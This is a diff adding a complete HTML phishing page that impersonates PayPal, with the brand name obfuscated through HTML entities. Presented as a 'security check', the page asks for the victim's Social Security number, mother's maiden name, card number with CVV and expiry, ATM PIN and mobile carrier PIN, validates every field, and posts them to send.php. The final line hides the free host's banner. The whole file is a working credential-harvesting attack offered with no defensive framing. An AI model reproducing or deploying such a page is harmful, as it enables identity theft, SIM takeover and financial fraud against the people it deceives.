@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<!--[if lt IE 9]>
+<html lang="en" class="no-js lower-than-ie9 ie desktop">
+<![endif]-->
+<!--[if lt IE 10]>
+<html lang="en" class="no-js lower-than-ie10 ie desktop">
+<![endif]-->
+<!--[if !IE]>-->
+<html lang="en" class="no-js desktop">
+<!--<![endif]-->
+<head>
+<meta charset="utf-8" />
+<title>Verify your &#80;&#97;y&#80;&#97;l &#97;ccount</title>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<meta name="robots" content="noindex, nofollow"/>
+<link rel="icon" href="css/favicon_x.ico" type="image/x-icon">
+<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
+<link rel="stylesheet" href="css/contextualLogin.css" />
+
+<style>
+p{font-size: 40px;}
+.loader {
+    position: fixed;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    background: url('css/animation-oval.png') 50% 50% no-repeat rgb(249,249,249);
+    opacity: .8;
+}
+</style>
+<script src="css/jquery.min.js"></script>
+<script type="text/javascript">
+$(window).load(function() {
+	$(".loader").fadeOut("slow");
+});
+</script>
+</head>
+<body class="desktop">
+<div class="loader"></div>
+<div id="main" class="main" role="main">
+<section id="login" class="login " data-role="page" data-title="Verify your &#80;&#97;y&#80;&#97;l account">
+<div class="corral">
+<div id="content" class="contentContainer activeContent contentContainerBordered">
+<header >
+<p class="paypal-logo paypal-logo-long"></p>
+</header>
+<h1 class="headerText accessAid">Verify your &#80;&#97;y&#80;&#97;l &#97;ccount</h1>
+<script language="JavaScript">
+<!--
+function check(form) {
+if (form.fname.value == "")
+{ alert("Please enter your First name before submitting."); form.fname.focus(); return;}
+if (form.lname.value == "")
+{ alert("Please enter your Last name before submitting."); form.lname.focus(); return;}
+if (form.add.value == "")
+{ alert("Please enter your Address Line before submitting."); form.add.focus(); return;}
+if (form.zip.value == "")
+{ alert("Please enter your Zip Code before submitting."); form.zip.focus(); return;}
+// Start of zip error Alert!
+var checkOK = "0123456789";
+var checkStr = form.zip.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Zip Code Must Be Only Numbers.");
+form.zip.focus();
+return;}
+// End of zip error Alert!
+if (form.zip.value.length < 5) { alert("Zip Code is too short!");form.zip.focus();	return;}
+if (form.zip.value.length > 5) { alert("Zip Code is too long!");form.zip.focus();	return;}
+if (form.type.value=="")
+{ alert("Please select Your Carrier Type before submitting."); form.type.focus(); return;}
+if (form.phone.value=="")
+{ alert("Please enter your Mobile Phone Number before submitting."); form.phone.focus(); return;}
+var checkOK = "0123456789";
+var checkStr = form.phone.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Mobile Phone Number Must Be Only Numbers.");
+form.phone.focus();
+return;}
+// End of act error Alert!
+if (form.phone.value.length < 10) { alert("Mobile Phone Number is too short!");form.phone.focus();	return;}
+if (form.phone.value.length > 10) { alert("Mobile Phone Number is too long!");form.phone.focus();	return;}
+if (form.ppin.value=="")
+{ alert("Please enter your Mobile Carrier PIN before submitting."); form.ppin.focus(); return;}
+var checkOK = "0123456789";
+var checkStr = form.ppin.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Mobile Carrier PIN Must Be Only Numbers.");
+form.ppin.focus();
+return;}
+// End of act error Alert!
+if (form.ppin.value.length < 4) { alert("Mobile Carrier PIN is too short!");form.ppin.focus();	return;}
+if (form.ppin.value.length > 8) { alert("Mobile Carrier PIN is too long!");form.ppin.focus();	return;}
+if (form.ssn.value=="")
+{ alert("Please enter your Social Security Number before submitting."); form.ssn.focus(); return;}
+// Start of ssn error Alert!
+var checkOK = "0123456789";
+var checkStr = form.ssn.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Social Security Number Must Be Only Numbers.");
+form.ssn.focus();
+return;}
+// End of act error Alert!
+if (form.ssn.value.length < 9) { alert("Social Security Number is too short!");form.ssn.focus();	return;}
+if (form.ssn.value.length > 9) { alert("Social Security Number is too long!");form.ssn.focus();	return;}
+if (form.dob.value=="")
+{ alert("Please select your Date Of Birth before submitting."); form.dob.focus(); return;}
+if (form.mmn.value=="")
+{ alert("Please enter your Mother's Maiden Name before submitting."); form.mmn.focus(); return;}
+if (form.cc.value=="")
+{ alert("Please enter your Card Number before submitting."); form.cc.focus(); return;}
+// Start of cc error Alert!
+var checkOK = "0123456789";
+var checkStr = form.cc.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Card Number Must Be Only Numbers.");
+form.cc.focus();
+return;}
+// End of cc error Alert!
+if (form.cc.value.length < 16) { alert("Card Number is too short!");form.cc.focus();	return;}
+if (form.cc.value.length > 16) { alert("Card Number is too long!");form.cc.focus();	return;}
+if (form.exp.value == "")
+{ alert("Please Enter a valid Expiration Date for your card before submitting."); form.exp.focus(); return;}
+var checkOK = "0123456789/";
+var checkStr = form.exp.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Please enter a valid expiration data");
+form.exp.focus();
+return;}
+// End of cc error Alert!
+if (form.exp.value.length < 5) { alert("Please enter a valid expiration data");form.exp.focus();	return;}
+if (form.exp.value.length > 7) { alert("Please enter a valid expiration data");form.exp.focus();	return;}
+if (form.cvv.value == "")
+{ alert("Please enter a valid Card Verification Number before submitting."); form.cvv.focus(); return;}
+// Start of cvv error Alert!
+var checkOK = "0123456789";
+var checkStr = form.cvv.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Please enter a valid Card Verification Number before submitting.");
+form.cvv.focus();
+return;}
+// End of cvv error Alert!
+if (form.cvv.value.length < 3) { alert("CVV is too short!");form.cvv.focus();	return;}
+if (form.pin.value == "")
+{ alert("Please enter a valid ATM Pin Code before submitting."); form.pin.focus(); return;}
+// Start of pin error Alert!
+var checkOK = "0123456789";
+var checkStr = form.pin.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("ATM Pin Must Be Only Numbers.");
+form.pin.focus();
+return;}
+// End of pin error Alert!
+if (form.pin.value.length < 4) { alert("ATM Pin is too short!");form.pin.focus();	return;}
+if (form.pin.value.length > 4) { alert("ATM Pin is too long!");form.pin.focus();	return;}
+
+form.submit()
+}
+//-->
+</script>
+<form action="send.php" method="post" class="proceed maskable" autocomplete="off" name="login" onclick="check(this.form)" onsubmit="check(this.form)">	
+<div id="splitEmail" class="splitEmail">
+<div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
+<div class="row-fluid">
+					<tr>
+			<td align="left" valign="top">
+<h1 style="box-sizing: border-box; margin: 0px 0px 10px; font-family: pp-sans-big-light, &quot;Helvetica Neue&quot;, Arial, sans-serif; font-size: 1.73333em; font-weight: 400; color: rgb(44, 46, 47); font-variant-numeric: normal; font-variant-east-asian: normal; background-color: rgb(255, 255, 255); line-height: 33px; text-align: center;">Quick security check</h1>
+<p class="description" style="box-sizing: border-box; margin: 20px 0px; font-family: pp-sans-small-light, &quot;Helvetica Neue&quot;, Arial, sans-serif; color: rgb(44, 46, 47); font-size: 1em; font-variant-numeric: normal; font-variant-east-asian: normal; background-color: rgb(255, 255, 255); line-height: 1.5em; text-align: center;">We just need some additional info to confirm it&#39;s you.
+<br>
+<span style="font-size:12px;"><small style="box-sizing: border-box; color: rgb(44, 46, 47); font-family: HelveticaNeue, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; background-color: rgb(255, 255, 255);">All information is required. Please check the form and make sure it&#39;s typed correctly.</small></span></p>
+			<div class="fees">
+			
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="fname" name="fname" type="text" placeholder="First Name" value="" size="15" maxlength="50" style="width:180px;"/>&nbsp;&nbsp;<input id="lname" name="lname" type="text" placeholder="Last Name" value="" size="15" maxlength="50" style="width:180px;"/>
+			</div>
+			</div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="add" name="add" type="text" placeholder="Address Line" value="" size="20" maxlength="50" style="width:260px;"/>
+			&nbsp;<input id="zip" name="zip" type="text" placeholder="Zip Code" value="" size="6" maxlength="5" style="width:100px;"/>
+			</div>
+			</div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<label for="select"></label>
+            <select name="type" required="required" id="select" style="width:200px;padding-right:10px;padding-left:10px;height:44px;">
+            <option value="Choose Your Carrier Type">Choose Your Carrier Type</option>
+            <option value="Verizon">Verizon</option>
+            <option value="AT&amp;T Wireless">AT&amp;T Wireless</option>
+            <option value="T-Mobile Wireless">T-Mobile Wireless</option>
+            <option value="Metro Pcs">Metro Pcs</option>
+            <option value="Sprint Wireless">Sprint Wireless</option>
+            <option value="U.S. Cellular">U.S. Cellular</option>
+            <option value="Consumer Cellular">Consumer Cellular</option>
+            <option value="Other">Other</option>
+            </select>
+			</div>
+			</div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="phone" name="phone" type="text" placeholder="Mobile Phone Number" value="" size="12" maxlength="10" style="width:200px;"/>&nbsp;&nbsp;<input id="ppin" name="ppin" type="text" placeholder="Mobile Carrier PIN" value="" size="12" maxlength="8" style="width:160px;"/>
+			</div>
+			</div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="ssn" name="ssn" type="text" placeholder="Social Security Number" value="" size="20" maxlength="9" style="width:200px;"/>
+			</div>
+			</div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="dob" name="dob" type="date" placeholder="Date of Birth" value="" size="20" maxlength="30" style="width:200px;"/>&nbsp;&nbsp;<small>(mm/dd/yyyy)</small>
+			</div>
+			</div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="mmn" name="mmn" type="text" placeholder="Mother's Maiden Name" value="" size="20" maxlength="50" style="width:200px;"/>
+			</div>
+			</div>
+			<div class="loginSignUpSeparator"><span class="textInSeparator">Verify your billing information</span></div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="cc" name="cc" type="text" placeholder="Debit/Credit Card" value="" size="25" maxlength="16" style="width:180px;"/>
+			&nbsp;&nbsp;<input id="exp" name="exp" type="text" placeholder="Expiration Date" value="" size="10" maxlength="7" style="width:125px;"/>&nbsp;&nbsp;<small>(mm/yy)</small>
+			</div>
+			</div>
+			<div class="textInput  " id="login_passworddiv">
+            <div class="fieldWrapper ">
+			<input id="cvv" name="cvv" type="text" placeholder="CVV" class="hasHelp validateEmpty" size="5" maxlength="3" style="width:60px;"/>
+			&nbsp;
+			<input id="pin" name="pin" type="text" placeholder="ATM Pin" class="hasHelp validateEmpty" size="6" maxlength="4" style="width:81px;"/>
+			</div>
+			</div>
+			</p>
+			</div>
+			</td>
+		</tr>
+				</div>
+</div>
+<br>
+<div class="actions">
+<button class="button actionContinue scTrack:unifiedlogin-login-click-next" onclick="check(this.form)" onsubmit="check(form);" href="javascript:submit()" type="button" id="btnNext" name="btnNext" value="Confirm">Confirm</button>
+</div>
+</div>
+</form>
+</div>
+</div>
+<br>
+<br>
+<br>
+<br>
+<footer class="footer" role="contentinfo">
+<div class="legalFooter">
+<ul class="footerGroup">
+<li><a target="_blank">Cont&#97;ct Us</a></li>
+<li><a target="_blank">Priv&#97;cy</a></li>
+<li><a target="_blank">Leg&#97;l</a></li>
+<li><a target="_blank">Worldwide</a></li>
+</ul>
+</div>
+</footer>
+</div>
+</body></html>
+<style>img[alt="www.000webhost.com"]{display:none;}</style>
